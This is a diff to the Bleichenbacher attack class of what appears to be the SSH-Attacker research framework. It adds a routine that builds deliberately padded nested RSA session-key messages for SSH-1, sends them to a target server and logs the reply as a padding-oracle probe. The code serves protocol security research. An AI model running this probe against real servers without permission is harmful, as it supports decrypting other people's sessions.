@@ -10,6 +10,8 @@ package de.rub.nds.sshattacker.attacks.impl;
 import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 
 import com.google.common.primitives.Bytes;
+import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
+import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.sshattacker.attacks.config.BleichenbacherCommandConfig;
 import de.rub.nds.sshattacker.attacks.general.KeyFetcher;
@@ -17,22 +19,31 @@ import de.rub.nds.sshattacker.attacks.pkcs1.*;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.BleichenbacherOracle;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Ssh1MockOracle;
+import de.rub.nds.sshattacker.attacks.pkcs1.util.PkcsConverter;
 import de.rub.nds.sshattacker.attacks.response.EqualityError;
 import de.rub.nds.sshattacker.core.config.Config;
 import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
+import de.rub.nds.sshattacker.core.constants.RunningModeType;
 import de.rub.nds.sshattacker.core.crypto.cipher.AbstractCipher;
 import de.rub.nds.sshattacker.core.crypto.cipher.CipherFactory;
 import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPrivateKey;
 import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
 import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
 import de.rub.nds.sshattacker.core.exceptions.CryptoException;
+import de.rub.nds.sshattacker.core.exceptions.WorkflowExecutionException;
 import de.rub.nds.sshattacker.core.protocol.common.ProtocolMessage;
+import de.rub.nds.sshattacker.core.protocol.ssh1.message.ClientSessionKeyMessage;
+import de.rub.nds.sshattacker.core.protocol.ssh1.message.ServerPublicKeyMessage;
 import de.rub.nds.sshattacker.core.state.State;
 import de.rub.nds.sshattacker.core.workflow.DefaultWorkflowExecutor;
 import de.rub.nds.sshattacker.core.workflow.ParallelExecutor;
 import de.rub.nds.sshattacker.core.workflow.WorkflowExecutor;
 import de.rub.nds.sshattacker.core.workflow.WorkflowTrace;
 import de.rub.nds.sshattacker.core.workflow.action.GenericReceiveAction;
+import de.rub.nds.sshattacker.core.workflow.action.ReceiveAction;
+import de.rub.nds.sshattacker.core.workflow.action.SendAction;
+import de.rub.nds.sshattacker.core.workflow.factory.WorkflowConfigurationFactory;
+import de.rub.nds.sshattacker.core.workflow.factory.WorkflowTraceType;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
@@ -298,6 +309,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
 
         Config sshConfig = getSshConfig();
         sshConfig.setWorkflowExecutorShouldClose(false);
+        sshConfig.setDoNotEncryptMessages(false);
         WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(sshConfig, msg);
 
         GenericReceiveAction receiveOracleResultAction = new GenericReceiveAction();
@@ -308,7 +320,28 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         workflowExecutor.executeWorkflow();
 
         ProtocolMessage<?> lastMessage = receiveOracleResultAction.getReceivedMessages().get(0);
-        LOGGER.debug("Received: {}", lastMessage.toString());
+        LOGGER.warn("Received: {}", lastMessage.toString());
+        System.exit(0);
+        return lastMessage.toString();
+    }
+
+    private String sendSinglePacket(byte[] msg, byte[] plain) {
+
+        Config sshConfig = getSshConfig();
+        sshConfig.setWorkflowExecutorShouldClose(false);
+        sshConfig.setDoNotEncryptMessages(false);
+        WorkflowTrace trace =
+                BleichenbacherWorkflowGenerator.generateWorkflow(sshConfig, msg, plain);
+
+        GenericReceiveAction receiveOracleResultAction = new GenericReceiveAction();
+        trace.addSshAction(receiveOracleResultAction);
+
+        State state = new State(sshConfig, trace);
+        WorkflowExecutor workflowExecutor = new DefaultWorkflowExecutor(state);
+        workflowExecutor.executeWorkflow();
+
+        ProtocolMessage<?> lastMessage = receiveOracleResultAction.getReceivedMessages().get(0);
+        LOGGER.warn("Received: {}", lastMessage.toString());
         System.exit(0);
         return lastMessage.toString();
     }
@@ -336,6 +369,142 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         return new BigInteger[] {e, d, N};
     }
 
+    /**
+     * Performs wrong padding of the session key.
+     *
+     * @param sessionID the session ID
+     * @param plainSessionKey the plain session key
+     * @return the padded and encrypted result
+     * @throws CryptoException if an error occurs during the process
+     */
+    private byte[] wrongPaddingSessionKey(byte[] sessionID, byte[] plainSessionKey)
+            throws CryptoException {
+
+        // XOR Session Key with Session ID
+        byte[] sessionKey = plainSessionKey.clone();
+        int i = 0;
+        for (byte sesseionByte : sessionID) {
+            sessionKey[i] = (byte) (sesseionByte ^ sessionKey[i++]);
+        }
+
+        // Choose correct encryptions for inner and outer
+        AbstractCipher innerCipher, outerCipher;
+
+        int innerBitlengh, outerBitlenght;
+
+        if (hostPublicKey.getModulus().bitLength() < serverPublicKey.getModulus().bitLength()) {
+            LOGGER.debug("Host is inner");
+            innerCipher = CipherFactory.getRsaTextbookCipher(hostPublicKey);
+            outerCipher = CipherFactory.getRsaTextbookCipher(serverPublicKey);
+            innerBitlengh = hostPublicKey.getModulus().bitLength();
+            outerBitlenght = serverPublicKey.getModulus().bitLength();
+        } else {
+            LOGGER.debug("Host is outer");
+            innerCipher = CipherFactory.getRsaTextbookCipher(serverPublicKey);
+            outerCipher = CipherFactory.getRsaTextbookCipher(hostPublicKey);
+            innerBitlengh = serverPublicKey.getModulus().bitLength();
+            outerBitlenght = hostPublicKey.getModulus().bitLength();
+        }
+
+        // Do padding and encrpytion according to modulus bit lenghtes
+        byte[] padded = PkcsConverter.doPkcs1Encoding(sessionKey, innerBitlengh / 8);
+        LOGGER.info("Padded: {}", ArrayConverter.bytesToRawHexString(padded));
+        byte[] encrypted = innerCipher.encrypt(padded);
+
+        byte[] nextPadded = PkcsConverter.doPkcs1Encoding(encrypted, outerBitlenght / 8);
+        LOGGER.info("Next Padded: {}", ArrayConverter.bytesToRawHexString(nextPadded));
+        byte[] nextEncrypted = outerCipher.encrypt(nextPadded);
+
+        // Return padded and encrypted result
+        return nextEncrypted;
+    }
+
+    /**
+     * Performs a testing procedure with different paddings. Throws a CryptoException if an error
+     * occurs during the process.
+     *
+     * @throws CryptoException if an error occurs during the process
+     */
+    private void testDifferentPaddings() throws CryptoException {
+
+        // Receive keys from server
+        getPublicKeys();
+        getHostPublicKey();
+        getServerPublicKey();
+
+        // Create workflowtrace to receive cookie and calculate session id
+        Config sshConfig = getSshConfig();
+        sshConfig.setWorkflowExecutorShouldClose(false);
+        sshConfig.setDoNotEncryptMessages(false);
+        WorkflowTrace trace =
+                new WorkflowConfigurationFactory(sshConfig)
+                        .createWorkflowTrace(
+                                WorkflowTraceType.KEX_SSH1_ONLY, RunningModeType.CLIENT);
+
+        ReceiveAction receiveAction = new ReceiveAction(new ServerPublicKeyMessage());
+        trace.addSshAction(receiveAction);
+
+        State state = new State(sshConfig, trace);
+        WorkflowExecutor workflowExecutor = new DefaultWorkflowExecutor(state);
+        workflowExecutor.executeWorkflow();
+
+        List<ProtocolMessage<?>> receivedMessages = receiveAction.getReceivedMessages();
+        LOGGER.info("recived size: {}", receivedMessages.size());
+        LOGGER.info(receivedMessages.get(0).toString());
+        byte[] sessionID = null;
+        if (!receivedMessages.isEmpty()
+                && receivedMessages.get(0) instanceof ServerPublicKeyMessage) {
+
+            byte[] sessionCookie =
+                    ((ServerPublicKeyMessage) receivedMessages.get(0))
+                            .getAntiSpoofingCookie()
+                            .getValue();
+            sessionID = calculateSessionID(sessionCookie);
+            LOGGER.info("SessionID is: {}", ArrayConverter.bytesToRawHexString(sessionID));
+            LOGGER.info("Cookie is: {}", ArrayConverter.bytesToRawHexString(sessionCookie));
+        }
+
+        // Cleanup old trace to remove already executed workflowelements, prevent creating a new
+        // connection and use the existing one
+        trace.removeSshAction(1);
+        trace.removeSshAction(2);
+        trace.removeSshAction(0);
+        sshConfig.setWorkflowExecutorShouldOpen(false);
+
+        // Create random session key, padd it wrong and create a correct session key message, set
+        // the plain and the encrypted key to be used in later worfklow correctly
+        Random random = new Random();
+        byte[] sessionKey = new byte[32];
+        random.nextBytes(sessionKey);
+
+        byte[] encryptedSecret = wrongPaddingSessionKey(sessionID, sessionKey);
+
+        ClientSessionKeyMessage clientSessionKeyMessage = new ClientSessionKeyMessage();
+        ModifiableByteArray encryptedSecretArray = new ModifiableByteArray();
+        ModifiableByteArray plainSecretArray = new ModifiableByteArray();
+        encryptedSecretArray.setModification(
+                ByteArrayModificationFactory.explicitValue(encryptedSecret));
+        plainSecretArray.setModification(ByteArrayModificationFactory.explicitValue(sessionKey));
+        clientSessionKeyMessage.setEncryptedSessioKey(encryptedSecretArray);
+        clientSessionKeyMessage.setPlaintextSessioKey(plainSecretArray);
+        trace.addSshAction(new SendAction(clientSessionKeyMessage));
+
+        // receive answer from the server
+        GenericReceiveAction receiveOracleResultAction = new GenericReceiveAction();
+        trace.addSshAction(receiveOracleResultAction);
+
+        try {
+            workflowExecutor.executeWorkflow();
+            // print results
+            ProtocolMessage<?> lastMessage = receiveOracleResultAction.getReceivedMessages().get(0);
+            LOGGER.warn("Received: {}", lastMessage.toShortString());
+        } catch (WorkflowExecutionException ex) {
+            LOGGER.error("got a Parser Exception");
+            LOGGER.info(
+                    "Server replied with unknown message -> it seems to be working correctly since the message could not be parsed");
+        }
+    }
+
     @Override
     public void executeAttack() {
         if (!config.getSendSinglePacket().isEmpty()) {
@@ -361,6 +530,13 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                 throw new RuntimeException(e);
             }
         }
+
+        try {
+            testDifferentPaddings();
+        } catch (CryptoException e) {
+            throw new RuntimeException(e);
+        }
+        System.exit(0);
 
         /*if (!isVulnerable()) {
             LOGGER.warn("The server is not vulnerable to Manger's attack");
@@ -536,8 +712,8 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                 jo.put("plaintext", ArrayConverter.bytesToRawHexString(solutionByteArray));
                 jo.put("ciphertext", ArrayConverter.bytesToRawHexString(encryptedSecret));
                 jo.put("time", timeElapsed);
-                jo.put("inner-Tries", attacker.getCounterInnerBleichenbacher());
-                jo.put("outer-Tries", attacker.getCounterOuterBleichenbacher());
+                jo.put("inner_tries", attacker.getCounterInnerBleichenbacher());
+                jo.put("outer_tries", attacker.getCounterOuterBleichenbacher());
                 jo.put("trimmed_outer", attacker.isOuterTrimmed());
                 jo.put("trimmed_inner", attacker.isInnerTrimmed());
                 jo.put("outer_trimmers", attacker.getOuterTrimmers());
